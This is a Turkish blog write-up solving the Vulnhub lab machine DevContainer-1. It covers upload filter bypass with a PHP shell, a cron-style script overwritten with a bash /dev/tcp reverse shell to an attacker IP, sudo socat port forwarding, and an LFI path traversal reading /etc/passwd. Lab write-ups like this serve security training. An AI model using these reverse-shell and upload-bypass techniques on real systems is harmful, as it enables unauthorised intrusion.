---
title: "VULN DevContainer-1 Write Up"
date: 2020-09-21T22:53:05+03:00
draft: false
toc: false
images:
tags: [Vulnhub,write-up,Docker,Container,sudo,lfi,burp suite] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/devcontainer-1,548/) 'da yer alan medium seviye DevContainer-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/vulnhub/devcontainer1/cover.png
  
---
"Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/devcontainer-1,548/) 'da yer alan medium seviye DevContainer-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."

## 1. Keşif Aşaması
{{< text >}}
Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
{{< /text >}}
```bash
netdiscover -i eth1
```

{{< image src="/images/vulnhub/devcontainer1/discover.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.

{{< image src="/images/vulnhub/devcontainer1/nmap.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

{{< text >}}
<br>
Tarayıcı ile web servisine istek atılır. Açılan sayfa ve kaynak kodları incelendiğinde olağan dışı bir bilgiye görülmemektedir.
<br>
<br>
{{< /text >}}

{{< image src="/images/vulnhub/devcontainer1/webpage.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Gobuster aracı ile Web dizin taraması gerçekleştirilir.
```bash
gobuster dir -u http://192.168.56.104/ -w /usr/share/wordlists/dirb/big.txt 
```

{{< image src="/images/vulnhub/devcontainer1/gobuster.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

**Upload** dizini dikkat çekmektedir. Tarayıcıdan istek atıldığında upload sayfası karşılamaktadır. İzin verilen dosya uzantıları ekranda yazılmaktadır.

{{< image src="/images/vulnhub/devcontainer1/upload.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Burpsuite uygulaması açılır ve normal bir resim dosyası yüklendiğinde giden istek incelenir.

{{< image src="/images/vulnhub/devcontainer1/normal.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Php uzantılı dosya yüklendiğinde giden isteğin _**Content-type**_ değeri ***image/gif*** şeklinde değiştirilerek deneme yapılır. Yükleme işlemi başarılı bir şekilde gerçekleşmektedir.

{{< image src="/images/vulnhub/devcontainer1/son.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

## 2. Erişim Sağlanması

İlgili port dinlenmeye alınarak upload ekranında yer alan index yazısına tıklanarak yüklenen dosya çağırılır ve reverse shell alınır.

{{< image src="/images/vulnhub/devcontainer1/shell.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

***/etc/passwd*** dosyası görüntülenerek sistemdeki kullanılar tespit edilir. Login olabilecek kullanıcı gözükmemektedir. Bu durumda bir container içerisinde olduğumuz tespit edilir. 

{{< image src="/images/vulnhub/devcontainer1/etc.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Web uygulamasının çalıştığı ***/var/www/html*** dizine geçilir.

{{< image src="/images/vulnhub/devcontainer1/dizin.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

**Maintenance-Web-Docker** dizini dikkat çekmektedir. Dizine girilerek içerisinde yer alan alan dosyalar incelenir.

{{< image src="/images/vulnhub/devcontainer1/webdocker.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

```terminal
cat maintenance.sh

#!/bin/bash
#Version 1.0
#This script monitors the uploaded files. It is a reverse shell monitoring measure.
#path= /home/richard/web/webapp/upload/files/
/home/richard/web/Maintenance-Web-Docker/list.sh


cat list.sh

#!/bin/bash
date >> /home/richard/web/Maintenance-Web-Docker/out.txt
ls /home/richard/web/upload/files/ | wc -l >> /home/richard/web/Maintenance-Web-Docker/out.txt
```

Dockerda yer alan **www** dizini ile **/home/richard/web/** dizini birbirine volume oluşturularak bağlanmıştır. List.sh dosyası shell alınacak şekilde düzenir ve çalıştırılır.

```bash
echo "bash -i &>/dev/tcp/192.168.56.105/7777 0>&1" > list.sh
```
7777 numaralı port dinlenir ve bağlantı sağlanır.

{{< image src="/images/vulnhub/devcontainer1/rev.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

User.txt dosyası okunarak ilk aşama tamamlanır.

{{< image src="/images/vulnhub/devcontainer1/userflag.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

## 3. Yetki Yükseltme

Sudo -l komutu ile yetkiler kontrol edilir.

{{< image src="/images/vulnhub/devcontainer1/sudo.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Parola gerektirmeden root yetkisi ile socat uygulamasının çalıştırılabildiği görülmektedir. **TCP-LISTEN 8080** ile 8080 portuna gelen bağlantılar dinlenir, **fork** ile gelen bağlantılar 90 portuna yönlendirilir.

```bash
sudo -u root /home/richard/HackTools/socat TCP-LISTEN\:8080\,fork TCP\:127.0.0.1\:90
```
Komut çalıştırıldığında 8080 portu gelen bağlantılar için dinlenmeye başlanır. Tarayıcıdan *http://makianaipsi:8080* istek atıldığında web sayfası açılır.

{{< image src="/images/vulnhub/devcontainer1/web.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Sayfada yer alan linklere tıklandığında lfi açığı olabileceği tespit edilir.

{{< image src="/images/vulnhub/devcontainer1/lfi.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

***view=../../../../../../etc/passwd*** parametre girilerek lfi açığı varlığı tespit edilir. Görüldüğü gibi include işlemi başarılı gerçekleşmiş ve passwd dosyası okunmuştur. 

{{< image src="/images/vulnhub/devcontainer1/passwd.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

İlk etapta upload ettiğimiz shell dosyası **../upload/files** klasörü altındadır. O dosya tekrar çağırılarak bağlantı alınır.

{{< image src="/images/vulnhub/devcontainer1/shell2.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

/root dizinine geçilir ve dizin listenir ve çözüm tamamlanır.

{{< image src="/images/vulnhub/devcontainer1/root.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}







































